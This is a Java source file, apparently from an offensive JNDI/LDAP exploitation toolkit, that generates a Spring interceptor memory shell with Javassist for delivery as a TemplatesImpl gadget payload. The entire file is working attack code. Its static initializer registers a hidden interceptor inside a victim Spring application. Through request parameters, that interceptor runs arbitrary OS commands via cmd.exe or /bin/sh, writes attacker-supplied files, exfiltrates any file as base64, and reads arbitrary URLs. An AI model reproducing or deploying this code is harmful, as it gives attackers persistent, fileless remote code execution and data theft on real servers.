package com.idiot9.ldap.templates;

import com.idiot9.ldap.gadgets.utils.ClassFiles;
import com.idiot9.ldap.gadgets.utils.Reflections;
import com.idiot9.ldap.gadgets.utils.TemplatesCreator;
import com.idiot9.ldap.utils.Cache;
import javassist.*;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.xml.transform.Templates;

@MemShell
public class SpringInterceptorTemplates implements TemplateFactory {
    private byte[] bytes;
    private String className;
    private String key;
    private Templates templates;


    public SpringInterceptorTemplates(String key) throws Exception {
        this.key = key;
        this.className = "BadInterceptor_within" + System.nanoTime();
        createTemplatesImpl();
    }

//    public SpringInterceptorTemplates(String key, String className) {
//        this.key = key;
//        this.className = className;
//    }


    @Override
    public void createTemplatesImpl() throws CannotCompileException, Exception {
        Templates tpl = (Templates) tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(TemplateFactory.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class));
        pool.insertClassPath(new ClassClassPath(AbstractHandlerMapping.class));
        pool.insertClassPath(new ClassClassPath(WebApplicationContext.class));
        pool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime");
        pool.importPackage("javax.servlet.http");
        pool.importPackage("javax.servlet");
        pool.importPackage("java.io");
        pool.importPackage("org.springframework.web.context.request");

        CtClass ctClass = pool.get(TemplateFactory.StubTransletPayload.class.getName());

        ctClass.setName(this.className);

        CtMethod readDir = CtNewMethod.make("public void readDir(java.io.PrintWriter writer, javax.servlet.http.HttpServletRequest request, java.lang.String dir) throws java.lang.Exception {\n" +
                "        java.lang.String urlContent = \"\";\n" +
                "        java.lang.String read = request.getParameter(\"read\");\n" +
                "        if (read != null) {\n" +
                "            writer.println(\"Windows file pattern---?read=file:/D:/tmp\");\n" +
                "            final java.net.URL url = new java.net.URL(read);\n" +
                "            final java.io.BufferedReader in = new java.io.BufferedReader(new InputStreamReader(url.openStream()));\n" +
                "            java.lang.String inputLine = \"\";\n" +
                "            while ((inputLine = in.readLine()) != null) {\n" +
                "                urlContent = urlContent + inputLine + \"\\n\";\n" +
                "            }\n" +
                "            in.close();\n" +
                "            writer.println(urlContent);\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(readDir);



        CtMethod writeFile = CtNewMethod.make("public void writeFile(java.lang.String writePath, java.lang.String base64) throws java.lang.Exception {\n" +
                "        if (writePath != null && base64 != null) {\n" +
                "            byte[] decode = java.util.Base64.getDecoder().decode(base64);\n" +
                "            new java.io.FileOutputStream(writePath).write(decode);\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(writeFile);

        CtMethod download = CtNewMethod.make("public void download(java.io.PrintWriter writer, java.lang.String file) throws java.lang.Exception {\n" +
                "        if (file != null) {\n" +
                "            byte[] bytes = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(file, new String[]{}));\n" +
                "            java.lang.String s = java.util.Base64.getEncoder().encodeToString(bytes);\n" +
                "            writer.write(s);\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(download);

        //这个一直报错，但是直接写到preHandle里却可以
        CtMethod command = CtNewMethod.make("public void command(java.io.PrintWriter writer, java.lang.String command) throws java.lang.Exception {\n" +
                "        if (command != null) {\n" +
                "            java.lang.String s = \"\";\n" +
                "            java.lang.ProcessBuilder p = new java.lang.ProcessBuilder(command.split(\" \"));\n" +
                "            if(java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\")){\n" +
                "                p = new java.lang.ProcessBuilder(new java.lang.String[]{\"cmd.exe\", \"/c\", command});\n" +
                "            }else{\n" +
                "                p = new java.lang.ProcessBuilder(new java.lang.String[]{\"/bin/sh\", \"-c\", command});\n" +
                "            }\n" +
                "            java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\A\");\n" +
                "            s = c.hasNext() ? c.next(): s;\n" +
                "            c.close();\n" +
                "            writer.write(s);\n" +
                "            writer.flush();\n" +
                "            writer.close();\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(command);


        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
                "            PrintWriter writer = response.getWriter();\n" +
                "            String writePath = request.getParameter(\"writePath\");\n" +
                "            String writeBytes = request.getParameter(\"writeBase64\");\n" +
                "            writeFile(writePath, writeBytes);\n" +
                "            String filePath = request.getParameter(\"download\");\n" +
                "            download(writer, filePath);\n" +
                "            String dir = request.getParameter(\"read\");\n" +
                "            readDir(writer, request, dir);\n" +
                "            String cmd = request.getParameter(\"" + this.key + "\");\n" +
                "            command(writer, cmd);" +
                "        return false;\n" +
                "    }", ctClass);
        //有一个很坑的地方，这里变量名和方法不能重名，之前String command一直错，改成String cmd就好了
        ctClass.addMethod(preHandle);


        String static_block = "try {\n" +
                "            org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
                "            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\"requestMappingHandlerMapping\");\n" +
                "            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
                "            field.setAccessible(true);\n" +
                "            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);\n" +
                "            " + this.className + " aaa = new " + this.className + "();\n" +
                "            adaptedInterceptors.add(aaa);\n" +
                "            System.out.println(\"Interceptor has been added\");\n" +
                "        }catch (java.lang.Exception e){}";

        ctClass.makeClassInitializer().insertAfter(static_block);




        CtClass superClass = pool.get(abstTranslet.getName());
        ctClass.setSuperclass(superClass);


        byte[] classBytes = ctClass.toBytecode();
        this.bytes = classBytes;

        this.templates = TemplateFactory.loadBytes(this.bytes, tpl);


    }

    @Override
    public String getClassName() {
        return this.className;
    }

    @Override
    public Templates getTemplates() {
        return this.templates;
    }

    @Override
    public void cache() throws Exception {
        Cache.set(this.className, this.bytes);
    }

    @Override
    public byte[] getBytes() {
        return this.bytes;
    }
}
